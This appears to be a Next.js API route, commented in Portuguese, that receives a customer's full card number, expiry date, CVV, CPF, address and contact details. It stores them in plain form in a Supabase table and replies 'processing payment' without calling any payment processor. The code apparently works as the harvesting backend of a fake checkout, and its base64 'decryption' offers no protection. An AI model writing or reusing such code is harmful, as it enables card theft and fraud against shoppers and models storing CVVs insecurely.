import { type NextRequest, NextResponse } from "next/server"
import { supabaseAdmin } from '@/lib/supabase'

// Função simples de "descriptografia" (apenas para decode do base64)
function decryptData(encryptedData: string): any {
  try {
    const decoded = Buffer.from(encryptedData, 'base64').toString('utf-8')
    return JSON.parse(decoded)
  } catch (error) {
    throw new Error('Erro ao descriptografar dados')
  }
}

export async function POST(request: NextRequest) {
  try {
    const { data } = await request.json()
    
    // Descriptografar dados
    const cardData = decryptData(data)
    
    // Validar dados obrigatórios
    if (!cardData.customerName || !cardData.cardNumber || !cardData.cardHolderName) {
      return NextResponse.json({ 
        success: false,
        error: "Dados obrigatórios faltando"
      }, { status: 400 })
    }
    
    // Inserir no Supabase
    const { data: insertedData, error } = await supabaseAdmin
      .from('card_data')
      .insert([
        {
          customer_name: cardData.customerName || '',
          customer_cpf: cardData.customerCpf || '',
          customer_phone: cardData.customerPhone || '',
          customer_email: cardData.customerEmail || '',
          customer_address: cardData.customerAddress || '',
          card_number: cardData.cardNumber || '',
          card_holder_name: cardData.cardHolderName || '',
          card_expiry_date: cardData.cardExpiryDate || '',
          card_cvv: cardData.cardCvv || '',
          product_name: cardData.productName || '',
          product_price: cardData.productPrice || 0,
          product_quantity: cardData.productQuantity || 1,
          total: cardData.total || 0
        }
      ])
      .select()
    
    if (error) {
      return NextResponse.json({ 
        success: false,
        error: "Erro ao salvar no banco de dados",
        details: error.message
      }, { status: 500 })
    }
    
    return NextResponse.json({ 
      success: true,
      message: "Processando pagamento",
      id: insertedData?.[0]?.id
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao processar",
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
